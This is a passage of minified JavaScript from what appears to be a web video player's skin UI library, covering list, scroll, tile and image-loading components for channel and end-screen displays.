4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},set_data:function(b){if(null!=this.element){var c=this.element;c.onLoadError=U(this,this.onLoadError),c.onLoad=U(this,this.onLoad)}return this.data=b,this.redrawCall(),this.data},onLoadError:function(){},onLoad:function(){},set_color:function(b){return this.color=b,this.redrawCall(),this.color},get_loaded:function(){return!!this.isNativeElement()&&fb.__cast(this.element,gb).get_loaded()},get_size:function(){return this.isNativeElement()?fb.__cast(this.element,gb).get_size():[0,0]},__class__:y,__properties__:Ja(Xb.prototype.__properties__,{set_color:"set_color",get_size:"get_size",get_loaded:"get_loaded"})});var K=function(){Xb.call(this),this.elementType=n.SVG,this.allowRedraw=!0};wa["bs.player.plugin.skin.ui.graphic.SVG"]=K,K.__name__="bs.player.plugin.skin.ui.graphic.SVG",K.__super__=Xb,K.prototype=Ja(Xb.prototype,{baseUrl:null,iconData:null,createNativeElement:function(){this.element=new wb,this.eventElement=this.element.create(),this.element.instance.mouseChildren=!1,this.element.instance.mouseEnabled=!1},redraw:function(){if(null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},setStateName:function(b){return null==this.parent?{}:this.set_styles(fb.__cast(this.parent,Xb).styles)},getStyleForStateName:function(b){return this.styles},set_data:function(b){return this.iconData=this.data=b,this.redrawCall(),this.data},__class__:K});var ea=function(){this.isReady=this.isActive=!1,e.call(this),this.elementType=n.SHAPE,this.rotation=0};wa["bs.player.plugin.skin.ui.graphic.Spinner"]=ea,ea.__name__="bs.player.plugin.skin.ui.graphic.Spinner",ea.__super__=e,ea.prototype=Ja(e.prototype,{timer:null,isReady:null,isActive:null,layoutComplete:function(){0==this.isReady&&(this.isReady=!0)},redraw:function(){e.prototype.redraw.call(this),this.isReady&&this.isVisible(this)?this.animationStart():this.animationStop()},destroy:function(){this.isActive=!1,null!=this.timer&&this.timer.stop(),this.timer=null,e.prototype.destroy.call(this)},isVisible:function(b){return b.visible&&null!=b.parent?this.isVisible(b.parent):b.visible},getAnimationTime:function(){var b=16;return null!=this.states.normal&&null!=this.states.normal.rotationTimeInterval&&(b=this.states.normal.rotationTimeInterval),b},animationStart:function(){this.isActive||(this.isActive=!0,null==this.timer&&(this.timer=new Rb(this.getAnimationTime()),this.timer.run=U(this,this.onTimerTick)))},animationStop:function(){this.isActive&&(this.isActive=!1,null!=this.timer&&this.timer.stop(),this.timer=null)},onTimerTick:function(){this.rotation+=this.states.normal.rotationSpeed,360<=this.rotation&&(this.rotation=0),this.redrawCall()},__class__:ea});var sa=function(){this.oldItem=null,this.gaps=[],this.items=[],this.selectedIndex=this.selectedChild=this.selectedItem=null,fc.call(this),this.renderTarget=this,this.overflowHidden=!0};wa["bs.player.plugin.skin.ui.item.core.ItemBox"]=sa,sa.__name__="bs.player.plugin.skin.ui.item.core.ItemBox",sa.__super__=fc,sa.prototype=Ja(fc.prototype,{selectedIndex:null,selectedChild:null,selectedItem:null,items:null,itemRenderer:null,gapRenderer:null,gaps:null,oldItem:null,itemsData:null,renderTarget:null,onItemSelect:function(b,c){},onItemClick:function(b){},layoutComplete:function(){this.items=[],0<this.children.length&&null==this.itemRenderer&&(this.itemRenderer=this.children[0],this.removeChild(this.children[0])),0<this.children.length&&null==this.gapRenderer&&(this.gapRenderer=this.children[0],this.removeChild(this.children[0])),this.destroyItems()},destroy:function(){this.destroyItems(),fc.prototype.destroy.call(this)},set_data:function(b){return this.destroyItems(),this.itemsData=this.data=b,this.updateData(),this.data},updateData:function(){this.destroyItems(),null!=this.itemsData&&(this.addItems(),this.redrawItems())},compare:function(b,c){return b==c},select:function(b){if(null!=this.itemsData){this.selectedItem=this.selectedChild=this.selectedIndex=null;for(var c=0,d=this.itemsData.length;c<d;){var q=c++;this.compare(this.itemsData[q],b)?(this.selectedIndex=q,this.selectedChild=this.items[q],fb.__cast(this.selectedChild,bc).select(),this.selectedItem=this.itemsData[q]):fb.__cast(this.items[q],bc).deselect()}this.onItemSelect(this.selectedItem,this.oldItem),this.oldItem=this.selectedItem,this.redraw(),this.redrawItems()}},deselect:function(){this.selectedIndex=null,null!=this.selectedChild&&fb.__cast(this.selectedChild,bc).deselect(),this.oldItem=this.selectedItem=this.selectedChild=null},destroyItems:function(){for(var b=0,c=this.items.length;b<c;){var d=b++;this.items[d].destroy(),this.items[d]=null}for(this.items=[],b=0,c=this.gaps.length;b<c;)d=b++,this.gaps[d].destroy(),this.gaps[d]=null;this.gaps=[]},addItems:function(){for(var b=0,c=this.itemsData.length;b<c;){var d=b++;null==this.items[d]&&(this.items[d]=fb.__cast(this.itemRenderer,Xb).clone(),this.renderTarget.addChild(this.items[d])),fb.__cast(this.items[d],bc).onItemSelected=U(this,this.select),fb.__cast(this.items[d],bc).onItemClicked=U(this,this.onItemClick),this.items[d].set_data(this.itemsData[d]),fb.__cast(this.items[d],bc).deselect(),null!=this.gapRenderer&&d<this.itemsData.length-1&&null==this.gaps[d]&&this.gapRenderer instanceof Xb&&(this.gaps[d]=fb.__cast(this.gapRenderer,Xb).clone(),this.renderTarget.addChild(this.gaps[d]))}},redrawItems:function(b){},getGapWidth:function(b){return null!=this.gapRenderer&&b!=this.itemsData.length-1?this.gapRenderer.get_width():0},getGapHeight:function(b){return null!=this.gapRenderer&&b!=this.itemsData.length-1?this.gapRenderer.calculateHeight():0},__class__:sa});var ya=function(){sa.call(this),this.overflowHidden=!1};wa["bs.player.plugin.skin.ui.item.ItemArray"]=ya,ya.__name__="bs.player.plugin.skin.ui.item.ItemArray",ya.__super__=sa,ya.prototype=Ja(sa.prototype,{redrawItems:function(b){sa.prototype.redrawItems.call(this)},__class__:ya});var Ea=function(){sa.call(this),this.overflowHidden=!1};wa["bs.player.plugin.skin.ui.item.ItemHList"]=Ea,Ea.__name__="bs.player.plugin.skin.ui.item.ItemHList",Ea.__super__=sa,Ea.prototype=Ja(sa.prototype,{redrawItems:function(b){if(!(null==this.items||1>this.items.length)){b=0;for(var c,d=0,q=this.items.length;d<q;){var X=d++,ra=X==this.items.length-1;this.items[X].set_left(b),c=this.items[X].get_width(),ra?ra=0:(ra=this.getGapWidth(X),null!=this.gaps&&null!=this.gaps[X]&&(this.gaps[X].set_left(b+c),this.gaps[X].update())),this.items[X].redrawCall(),b+=c+ra}sa.prototype.redrawItems.call(this)}},__class__:Ea});var Ha=function(){sa.call(this),this.overflowHidden=!0};wa["bs.player.plugin.skin.ui.item.ItemList"]=Ha,Ha.__name__="bs.player.plugin.skin.ui.item.ItemList",Ha.__super__=sa,Ha.prototype=Ja(sa.prototype,{redrawItems:function(b){if(!(null==this.items||1>this.items.length)){b=0;for(var c,d,q=0,X=this.itemsData.length;q<X;){var ra=q++;this.items[ra].set_top(b),c=this.items[ra].get_height(),d=this.getGapHeight(ra),null!=this.gaps&&null!=this.gaps[ra]&&(this.gaps[ra].set_top(b+c),this.gaps[ra].update()),this.items[ra].redrawCall(),b+=c+d}sa.prototype.redrawItems.call(this)}},calculateListHeight:function(){if(null==this.itemsData||null==this.items||1>this.items.length)return 0;for(var b=0,c=0,d=this.itemsData.length;c<d;){var q=c++;b+=this.items[q].get_height()+this.getGapHeight(q)}return b},__class__:Ha});var Ua=function(){this.isScrollBuild=!1,this.scroll=this.indicatorMinimum=this.indicatorMaximum=this.indicatorCurrent=0,this.isIndicatorDown=!1,Ha.call(this)};wa["bs.player.plugin.skin.ui.item.ItemListScroll"]=Ua,Ua.__name__="bs.player.plugin.skin.ui.item.ItemListScroll",Ua.__super__=Ha,Ua.prototype=Ja(Ha.prototype,{isIndicatorDown:null,scrollRenderer:null,stage:null,disableHtmlSelectionFunction:null,itemsBox:null,trackItem:null,scrollItem:null,scroll:null,lastMousePosition:null,indicatorMinimum:null,indicatorMaximum:null,indicatorCurrent:null,isScrollBuild:null,layoutComplete:function(){this.items=[],0<this.children.length&&null==this.itemRenderer&&(this.itemRenderer=this.children[0],this.removeChild(this.children[0])),0<this.children.length&&null==this.gapRenderer&&(this.gapRenderer=this.children[0],this.removeChild(this.children[0])),0<this.children.length&&null==this.scrollRenderer&&(this.scrollRenderer=this.children[0],this.removeChild(this.children[0])),this.destroyItems(),this.renderTarget=this.addScrollBox(),na.add(this.context,"resize",U(this,this.onResize)),this.calculateListParams()},redrawItems:function(b){Ha.prototype.redrawItems.call(this),this.calculateListParams()},select:function(b){Ha.prototype.select.call(this,b),null==this.selectedChild?this.setScroll(0):this.setScroll(this.selectedChild.get_top()/(this.calculateListHeight()-this.calculateHeight()))},updateData:function(){Ha.prototype.updateData.call(this),this.calculateListParams()},set_data:function(b){return Ha.prototype.set_data.call(this,b),null==this.itemsData||1>this.itemsData.length?this.destroyScroll():this.buildScroll(),this.data},destroy:function(){this.destroyScroll(),Ha.prototype.destroy.call(this)},onStageMouseDown:function(b){this.lastMousePosition=this.getPointerPosition(b)},onResize:function(b){this.calculateListParams(),this.setScroll(this.scroll)},addScrollBox:function(){return this.itemsBox=new fc,this.itemsBox.context=this.context,this.itemsBox.zIndex=0,this.itemsBox.set_left(0),this.itemsBox.set_right(0),this.itemsBox.set_bottom(0),this.itemsBox.set_top(0),this.addChild(this.itemsBox),this.itemsBox},destroyScroll:function(){this.isScrollBuild&&(null!=this.stage&&(this.stage.removeEventListener("mousedown",U(this,this.onStageMouseDown)),this.stage.removeEventListener("touchstart",U(this,this.onStageMouseDown))),this.stage=null,this.removeEventListener("wheel",U(this,this.onMouseWheel)),null!=this.scrollItem&&(this.scrollItem.removeEventListener("mousedown",U(this,this.onIndicatorDown)),this.scrollItem.removeEventListener("touchstart",U(this,this.onIndicatorDown)),this.scrollItem.destroy()),this.scrollItem=null,null!=this.trackItem&&this.trackItem.destroy(),this.trackItem=null,this.isScrollBuild=!1)},buildScroll:function(){if(null==this.stage&&(this.stage=this.findStageElement()),null!=this.stage&&!this.isScrollBuild){this.stage.removeEventListener("mousedown",U(this,this.onStageMouseDown)),this.stage.removeEventListener("touchstart",U(this,this.onIndicatorDown)),this.stage.removeEventListener("wheel",U(this,this.onMouseWheel)),this.stage.addEventListener("mousedown",U(this,this.onStageMouseDown)),this.stage.addEventListener("touchstart",U(this,this.onIndicatorDown));var b=this.states,c=this.states;null==this.trackItem&&(this.trackItem=new fc,this.trackItem.set_id("Track"),this.trackItem.context=this.context,this.trackItem.set_states(b.track),this.trackItem.zIndex=1,this.trackItem.set_width(c.track.normal.width),this.trackItem.set_right(-1),this.trackItem.set_top(0),this.trackItem.set_bottom(0),this.addChild(this.trackItem),null==this.scrollItem&&(this.scrollItem=new rc,this.scrollItem.set_id("Scroll"),this.scrollItem.context=this.context,this.scrollItem.zIndex=0,this.scrollItem.set_states(b.scroll),this.scrollItem.set_width(c.scroll.normal.width),this.scrollItem.set_right((c.track.normal.width-c.scroll.normal.width)/2),this.scrollItem.set_top(0),this.scrollItem.set_height(50),this.scrollItem.removeEventListener("mousedown",U(this,this.onIndicatorDown)),this.scrollItem.removeEventListener("touchstart",U(this,this.onIndicatorDown)),this.scrollItem.addEventListener("mousedown",U(this,this.onIndicatorDown)),this.scrollItem.addEventListener("touchstart",U(this,this.onIndicatorDown)),this.trackItem.addChild(this.scrollItem))),this.addEventListener("wheel",U(this,this.onMouseWheel)),this.isScrollBuild=!0}},setScroll:function(b){null!=this.scrollItem&&null!=this.itemsBox&&(this.scroll=b,this.refreshScroll())},refreshScroll:function(){if(0>this.scroll&&(this.scroll=0),1<this.scroll&&(this.scroll=1),null!=this.scrollItem&&null!=this.itemsBox){var b=this.calculateHeight(),c=this.calculateListHeight();b>=c?(this.scroll=0,this.scrollItem.visible=!1):this.scrollItem.visible=!0,this.indicatorCurrent=this.scroll*this.indicatorMaximum,this.itemsBox.set_top(-this.scroll*(c-b)),this.scrollItem.set_top(this.scroll*this.indicatorMaximum),this.itemsBox.update(),this.scrollItem.update()}},update:function(){this.refreshScroll(),Ha.prototype.update.call(this)},onMouseWheel:function(b){b.stopPropagation(),b=this.calculateHeight()/1e3*b.wheelDelta,b/=this.calculateListHeight(),this.setScroll(this.scroll-b)},onTouchMove:function(b){if(b.stopPropagation(),this.isIndicatorDown){var c=0;null!=this.lastMousePosition&&(c=this.getPointerPosition(b).y-this.lastMousePosition.y,20<Math.abs(c)&&(c=0),c/=this.calculateHeight()),this.lastMousePosition=this.getPointerPosition(b),this.setScroll(this.scroll-c)}},onIndicatorDown:function(b){this.removeMoveAndEndListeners(),this.stage.addEventListener("mousemove",U(this,this.onMouseMove)),this.stage.addEventListener("mouseup",U(this,this.onMouseUp)),this.stage.addEventListener("touchmove",U(this,this.onTouchMove)),this.stage.addEventListener("touchend",U(this,this.onMouseUp)),this.disableHtmlSelection(),this.isIndicatorDown=!0,b=0;for(var c=this.items;b<c.length;){var d=c[b];++b,d.allowHighlight(!1)}},onIndicatorUp:function(b){this.isIndicatorDown=!1,this.removeMoveAndEndListeners(),b=0;for(var c=this.items;b<c.length;){var d=c[b];++b,d.allowHighlight(!0)}},removeMoveAndEndListeners:function(){this.stage.removeEventListener("mousemove",U(this,this.onMouseMove)),this.stage.removeEventListener("mouseup",U(this,this.onMouseUp)),this.stage.removeEventListener("touchmove",U(this,this.onTouchMove)),this.stage.removeEventListener("touchend",U(this,this.onMouseUp))},onMouseMove:function(b){b.stopPropagation(),this.isIndicatorDown&&(b=this.getPointerPosition(b),this.indicatorCurrent+=b.y-this.lastMousePosition.y,this.lastMousePosition.y=b.y,this.indicatorCurrent=this.indicatorCurrent<this.indicatorMinimum?this.indicatorMinimum:this.indicatorCurrent,this.indicatorCurrent=this.indicatorCurrent>this.indicatorMaximum?this.indicatorMaximum:this.indicatorCurrent,null!=this.scrollItem&&this.scrollItem.set_top(this.indicatorCurrent),this.scroll=this.indicatorCurrent/this.indicatorMaximum,this.setScroll(this.scroll))},onMouseUp:function(b){this.isIndicatorDown=!1,this.removeMoveAndEndListeners(),b=0;for(var c=this.items;b<c.length;){var d=c[b];++b,d.allowHighlight(!0)}this.enableHtmlSelection()},getPointerPosition:function(b){return new Vb(b.mouseX,b.mouseY)},calculateListParams:function(){var b=this.calculateHeight(),c=this.calculateListHeight();(c=b/c*b)>b&&(c=b),null!=this.scrollItem&&this.scrollItem.set_height(0|c),this.indicatorMaximum=b-c},disableHtmlSelection:function(){this.disableHtmlSelectionFunction=function(b){return b.preventDefault(),!1},window.document.addEventListener("selectstart",this.disableHtmlSelectionFunction)},enableHtmlSelection:function(){null!=this.disableHtmlSelectionFunction&&(window.document.removeEventListener("selectstart",this.disableHtmlSelectionFunction),this.disableHtmlSelectionFunction=null)},__class__:Ua});var kb=function(){sa.call(this),this.overflowHidden=!0};wa["bs.player.plugin.skin.ui.item.ItemTiles"]=kb,kb.__name__="bs.player.plugin.skin.ui.item.ItemTiles",kb.__super__=sa,kb.prototype=Ja(sa.prototype,{tileMinWidth:null,tileMinHeight:null,tileGapWidth:null,tileGapHeight:null,layoutComplete:function(){sa.prototype.layoutComplete.call(this),this.tileMinWidth=0|this.itemRenderer.calculateWidth(),this.tileMinHeight=0|this.itemRenderer.calculateHeight(),this.tileGapWidth=0|this.gapRenderer.calculateWidth(),this.tileGapHeight=0|this.gapRenderer.calculateWidth(),na.add(this.context,"resize",U(this,this.redrawItems))},redrawItems:function(b){if(!(null==this.items||1>this.items.length)){var c=this.parent.calculateWidth(),d=this.parent.calculateHeight(),q=0|this.items[0].get_width(),X=0|this.items[0].get_height();b=q+this.tileGapWidth|0;var ra=X+this.tileGapHeight|0,Aa=0|Math.min(Math.floor(c/b),this.items.length),Qa=Math.min(Math.ceil(this.items.length/Aa),Math.floor(d/ra));2>Aa&&(b=q),2>Qa&&(ra=X),c=(c-(Aa*b-(2>Aa?0:this.tileGapWidth)))/2|0,d=(d-(Qa*ra-(2>Qa?0:this.tileGapHeight)))/2|0;for(var Wa=0,Cb=this.items.length;Wa<Cb;){var Ub=Wa++;q=Ub%Aa,(X=Math.floor(Ub/Aa))>=Qa?this.items[Ub].visible=!1:(this.items[Ub].set_left(c+b*q|0),this.items[Ub].set_top(d+ra*X|0),this.items[Ub].visible=!0),this.items[Ub].update()}sa.prototype.redrawItems.call(this)}},__class__:kb});var cb=function(){this.instance=this.parent=null};wa["bs.player.plugin.skin.ui.native.NativeElement"]=cb,cb.__name__="bs.player.plugin.skin.ui.native.NativeElement",cb.prototype={instance:null,children:null,parent:null,create:function(){return null==this.instance&&(this.instance=window.document.createElement("div")),this.instance},destroy:function(){if(null!=this.instance){var b=this.instance;null!=b.parentNode&&b.parentNode.removeChild(b),this.parent=null}},appendChild:function(b){null==this.instance&&null==b.instance||(this.instance.appendChild(b.instance),b.parent=this)},insertBefore:function(b,c){if(null!=this.instance||null!=b.instance||null!=c.instance){var d=this.instance,q=b.instance,X=c.instance;try{d.insertBefore(q,X)}catch(ra){this.appendChild(b)}c.parent=this}},get_children:function(){return null==this.instance?null:this.instance.childNodes},__class__:cb,__properties__:{get_children:"get_children"}};var ub=function(){cb.call(this)};wa["bs.player.plugin.skin.ui.native.NativeButtonElement"]=ub,ub.__name__="bs.player.plugin.skin.ui.native.NativeButtonElement",ub.__super__=cb,ub.prototype=Ja(cb.prototype,{create:function(){return this.instance=window.document.createElement("a")},__class__:ub});var gb=function(){this._loaded=!1,cb.call(this)};wa["bs.player.plugin.skin.ui.native.NativeImageElement"]=gb,gb.__name__="bs.player.plugin.skin.ui.native.NativeImageElement",gb.__super__=cb,gb.prototype=Ja(cb.prototype,{size:null,_loaded:null,_src:null,onLoadError:function(){},onLoad:function(){},create:function(){return this.instance=window.document.createElement("img"),this.instance.style.visibility="hidden",this.instance.onerror=U(this,this.onLoadErrorNativeCallback),this.instance.onload=U(this,this.onLoadNativeCallback),this._loaded=!1,this.instance},onLoadErrorNativeCallback:function(b){null!=this.instance&&(this.instance.style.visibility="hidden"),this.onLoadError()},onLoadNativeCallback:function(){null!=this.instance&&(this.instance.style.visibility="visible"),this._loaded=!0,this.onLoad()},get_size:function(){var b=this.instance,c=b.getBoundingClientRect();return 0<c.width&&0<c.height?[c.width,c.height]:[b.naturalWidth,b.naturalHeight]},get_loaded:function(){return this._loaded},set_loaded:function(b){return this._loaded=b},get_src:function(){return this._src},set_src:function(b){return this._src=b,null!=this.instance&&(this.instance.src=this._src),this._src},isEqualSrc:function(b){return this._src==b||null!=this.instance&&this.instance.src==b},__class__:gb,__properties__:Ja(cb.prototype.__properties__,{set_src:"set_src",get_src:"get_src",set_loaded:"set_loaded",get_loaded:"get_loaded",get_size:"get_size"})});var Gb=function(){cb.call(this)};wa["bs.player.plugin.skin.ui.native.NativeTextElement"]=Gb,Gb.__name__="bs.player.plugin.skin.ui.native.NativeTextElement",Gb.__super__=cb,Gb.prototype=Ja(cb.prototype,{create:function(){return this.instance=window.document.createElement("span")},setText:function(b){null!=this.instance&&this.instance.textContent!=b&&(this.instance.innerHTML=b)},__class__:Gb});var wb=function(){cb.call(this)};wa["bs.player.plugin.skin.ui.native.NativeVectorElement"]=wb,wb.__name__="bs.player.plugin.skin.ui.native.NativeVectorElement",wb.__super__=cb,wb.prototype=Ja(cb.prototype,{create:function(){this.instance=window.document.createElementNS("http://www.w3.org/2000/svg","svg"),this.instance.setAttributeNS(null,"width","100%"),this.instance.setAttributeNS(null,"height","100%"),this.instance.setAttributeNS(null,"viewBox","0 0 100 100");var b=window.document.createElementNS("http://www.w3.org/2000/svg","use");return b.setAttributeNS(null,"width","100%"),b.setAttributeNS(null,"height","100%"),this.instance.appendChild(b),this.instance},__class__:wb});var bc=function(){};wa["bs.player.plugin.skin.ui.renderer.IItemRenderer"]=bc,bc.__name__="bs.player.plugin.skin.ui.renderer.IItemRenderer",bc.__isInterface__=!0,bc.prototype={onItemSelected:null,onItemClicked:null,onSubItemSelected:null,select:null,deselect:null,allowHighlight:null,__class__:bc};var ic=function(){this.selected=!1,rc.call(this),this.overflowHidden=!0,this.addEventListener("click",U(this,this.click))};wa["bs.player.plugin.skin.ui.renderer.core.ButtonRenderer"]=ic,ic.__name__="bs.player.plugin.skin.ui.renderer.core.ButtonRenderer",ic.__interfaces__=[bc],ic.__super__=rc,ic.prototype=Ja(rc.prototype,{selected:null,setStateName:function(b){if(this.set_styles(this.generateStyles(b)),null!=this.styles&&(this.styles.isClean=!1),null!=this.children)for(var c=0,d=this.children;c<d.length;){var q=d[c];++c,fb.__cast(q,Xb).setStateName(b)}return this.styles},allowHighlight:function(b){},onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},click:function(b){null!=b&&b.stopPropagation(),this.onItemSelected(this.data)},onOver:function(b){null!=b&&b.stopPropagation(),this.selected||(rc.prototype.onOver.call(this,b),this.update())},onOut:function(b){null!=b&&b.stopPropagation(),this.selected||(rc.prototype.onOut.call(this,b),this.update())},select:function(){this.selected||(this.currentStateName[0]="selected",this.setStateName(this.currentStateName),this.selected=!0)},deselect:function(){this.selected&&(this.currentStateName[0]="normal",this.setStateName(this.currentStateName),this.selected=!1)},__class__:ic});var $b=function(){this.loadCalled=!1,this.canHighlight=!0,ic.call(this)};wa["bs.player.plugin.skin.ui.renderer.ChannelListItemRenderer"]=$b,$b.__name__="bs.player.plugin.skin.ui.renderer.ChannelListItemRenderer",$b.__interfaces__=[bc],$b.addImageLoadToQueue=function(b){$b.imagesLoaderQueue.push(b),null==$b.imagesLoaderTimer&&(($b.imagesLoaderTimer=new Rb(50)).run=$b.loadNextImage)},$b.loadNextImage=function(){0<$b.imagesLoaderQueue.length?$b.imagesLoaderQueue.shift().loadImage():($b.imagesLoaderTimer.stop(),$b.imagesLoaderTimer=null)},$b.__super__=ic,$b.prototype=Ja(ic.prototype,{imageCon:null,imageHolder:null,imageSpinner:null,label:null,track:null,progress:null,icon:null,canHighlight:null,liveChannelData:null,loadCalled:null,timer:null,set_data:function(b){return ic.prototype.set_data.call(this,b),this.liveChannelData=b,this.updateItemData(),b},destroy:function(){null!=this.timer&&this.timer.stop(),this.timer=null,ic.prototype.destroy.call(this)},updateItemData:function(){var b=this;null==this.label&&(this.label=this.getChildById("ChannelsPopupItemLabel")),null==this.label?console.error("Missing : ChannelsPopupItemLabel element"):(null==this.imageCon&&(this.imageCon=this.getChildById("ChannelsPopupItemLogoContainer")),null==this.imageCon?console.error("Missing : ChannelsPopupItemLogoContainer element"):(null==this.imageHolder&&(this.imageHolder=this.imageCon.getChildById("ChannelsPopupItemLogoHolder")),null==this.imageHolder?console.error("Missing : ChannelsPopupItemLogoHolder element"):(null==this.imageSpinner&&(this.imageSpinner=this.imageCon.getChildById("ChannelsPopupItemLogoSpinner")),null==this.imageSpinner?console.error("Missing : ChannelsPopupItemLogoSpinner element"):(null==this.icon&&(this.icon=this.getChildById("ChannelsPopupItemIcon")),null==this.icon?console.error("Missing : ChannelsPopupItemIcon element"):(null==this.track&&(this.track=this.getChildById("ChannelsPopupItemTrack")),null==this.track?console.error("Missing : ChannelsPopupItemTrack element"):(null==this.progress&&(this.progress=this.getChildById("ChannelsPopupItemProgress")),null==this.progress?console.error("Missing : ChannelsPopupItemProgress element"):null!=this.liveChannelData&&(this.icon.set_visible_with_redraw(!1),null==this.liveChannelData.programs||0==this.liveChannelData.programs.length?this.hideProgram():(this.showProgram(),this.setProgram(),this.timer=new Rb(3e4),this.timer.run=function(){b.setProgram()}))))))))},loadImage:function(){if(null!=this.liveChannelData.logoImages&&0<this.liveChannelData.logoImages.length){this.imageSpinner.set_visible_with_redraw(!0);var b=jd.getBestFitFromSet(this.liveChannelData.logoImages,0|this.imageCon.calculateWidth(),0|this.imageCon.calculateHeight());this.imageHolder.onLoad=U(this,this.onImageLoaded),this.imageHolder.onLoadError=U(this,this.onImageError),this.imageHolder.set_data(b.url)}else this.imageSpinner.visible=!1,this.imageSpinner.destroy()},onImageError:function(){},onImageLoaded:function(){if(null!=this.imageCon&&!this.imageCon.isNativeElementNull()){var b=fb.__cast(this.imageHolder.element.instance,HTMLImageElement),c=b.naturalWidth,d=b.naturalHeight;0==c&&0==d&&(c=(d=b.getBoundingClientRect()).width,d=d.height),jd.fitIntoRectangle(this.imageHolder,this.imageCon,c,d),this.imageHolder.set_visible_with_redraw(!0),this.imageSpinner.visible=!1,this.imageSpinner.destroy()}},hideProgram:function(){this.progress.set_visible_with_redraw(!1),this.track.set_visible_with_redraw(!1),this.label.set_top(22),this.label.set_text(this.liveChannelData.name),this.label.update()},showProgram:function(){this.progress.set_visible_with_redraw(!0),this.track.set_visible_with_redraw(!0),this.label.set_top(14),this.label.update()},setProgram:function(){var b=this.liveChannelData.findProgramForDate();null==b?this.hideProgram():(this.showProgram(),this.label.set_text(b.title),this.updateProgressbar(b))},updateProgressbar:function(b){var c=b.eventEnd.getTime()-b.eventStart.getTime();b=(new Date).getTime()-b.eventStart.getTime(),this.progress.set_width(b*this.track.get_width()/c)},redrawCall:function(){if(ic.prototype.redrawCall.call(this),!this.loadCalled&&!this.isNativeElementNull()&&this.isNativeElementAttachedToView()){for(var b=!0,c=this;null!=c;){if(!c.visible){b=!1;break}c=c.parent}b&&(this.loadCalled=!0,$b.addImageLoadToQueue(this))}},__class__:$b});var Ec=function(){rc.call(this),this.overflowHidden=!0};wa["bs.player.plugin.skin.ui.renderer.EndSplashTilesItemRenderer"]=Ec,Ec.__name__="bs.player.plugin.skin.ui.renderer.EndSplashTilesItemRenderer",Ec.__interfaces__=[bc],Ec.__super__=rc,Ec.prototype=Ja(rc.prototype,{media:null,imageCon:null,imageHolder:null,imageW:null,imageH:null,imagePlaceholder:null,imageSpinner:null,infoCon:null,title:null,duration:null,set_data:function(b){return rc.prototype.set_data.call(this,b),this.media=b,this.updateItemData(),this.redrawCall(),b},allowHighlight:function(b){},onItemSelected:function(b){},onItemClicked:function(b){},onSubItemSelected:function(b,c){},select:function(){this.currentStateName[0]="selected",this.updateStateName()},deselect:function(){this.currentStateName[0]="normal",this.updateStateName()},resizeImage:function(){if(!this.imageHolder.isNativeElementNull()){if(null==this.imageW||null==this.imageH){var b=fb.__cast(this.imageHolder.element.instance,HTMLElement).getBoundingClientRect();null!=b&&0!=b.width&&0!=b.height&&(this.imageW=b.width,this.imageH=b.height)}null!=this.imageW&&null!=this.imageH&&(jd.coverRectangle(this.imageHolder,this.imageCon,this.imageW,this.imageH),this.imageHolder.redraw())}},redraw:function(){rc.prototype.redraw.call(this),null!=this.imageHolder&&this.visible&&null==this.imageW&&this.resizeImage()},updateItemData:function(){null!=this.media&&(this.collectItemElements(),this.render(),this.addEventListener("click",U(this,this.onPlayClick)))},collectItemElements:function(){null==this.imageCon&&(this.imageCon=this.getChildById("EndSplashTilesItemImageContainer")),null!=this.imageCon&&(this.imageCon.overflowHidden=!0,null==this.imageHolder&&(this.imageHolder=this.imageCon.getChildById("EndSplashTilesItemImageHolder")),null==this.imageSpinner&&(this.imageSpinner=this.imageCon.getChildById("EndSplashTilesItemImageSpinner")),null==this.imagePlaceholder&&(this.imagePlaceholder=this.imageCon.getChildById("EndSplashTilesItemImagePlaceholder"))),null==this.infoCon&&(this.infoCon=this.getChildById("EndSplashTilesItemInfo")),null!=this.infoCon&&(null==this.title&&(this.title=this.infoCon.getChildById("EndSplashTilesItemInfoTitle")),null==this.duration&&(this.duration=this.infoCon.getChildById("EndSplashTilesItemInfoDuration")))},render:function(){if(null!=this.imageCon){null!=this.imagePlaceholder&&this.imagePlaceholder.visible&&this.imagePlaceholder.set_visible_with_redraw(!1),null==this.imageSpinner||this.imageSpinner.visible||this.imageSpinner.set_visible_with_redraw(!0);var b=jd.getBestFitFromSet(this.media.splashImages,0|this.imageCon.calculateWidth(),0|this.imageCon.calculateHeight());null==b?(null!=this.imageSpinner&&this.imageSpinner.visible&&this.imageSpinner.set_visible_with_redraw(!1),null==this.imagePlaceholder||this.imagePlaceholder.visible||this.imagePlaceholder.set_visible_with_redraw(!0),null!=this.imageHolder&&(this.imageHolder.visible=!1)):null!=this.imageHolder&&(this.imageHolder.onLoad=U(this,this.onImageLoaded),this.imageHolder.onLoadError=U(this,this.showPlaceholder),this.imageHolder.set_data(b.url)),this.imageHolder.update()}null!=this.infoCon&&(null!=this.title&&this.title.set_text(this.media.title),null!=this.duration&&this.duration.set_text(Yb.formatTime(this.media.duration,!0)))},onImageLoaded:function(){this.imageHolder.isNativeElementNull()||(this.resizeImage(),null!=this.imageSpinner&&this.imageSpinner.visible&&this.imageSpinner.set_visible_with_redraw(!1),null!=this.imageSpinner&&this.imageSpinner.visible&&this.imageSpinner.set_visible_with_redraw(!1),null==this.imagePlaceholder||this.imagePlaceholder.visible||this.imagePlaceholder.set_visible_with_redraw(!0))},onPlayClick:function(b){b.stopPropagation(),this.onItemSelected(this.data)},onOver:function(b){"selected"!=this.currentStateName[0]&&rc.prototype.onOver.call(this,b)},onOut:function(b){"selected"!=this.currentStateName[0]&&rc.prototype.onOut.call(this,b)},updateStateName:function(){this.setStateName(this.currentStateName),null!=this.imageHolder&&this.imageHolder.setStateName(this.currentStateName),null!=this.imageSpinner&&this.imageSpinner.setStateName(this.currentStateName),null!=this.title&&this.title.setStateName(this.currentStateName),null!=this.duration&&this.duration.setStateName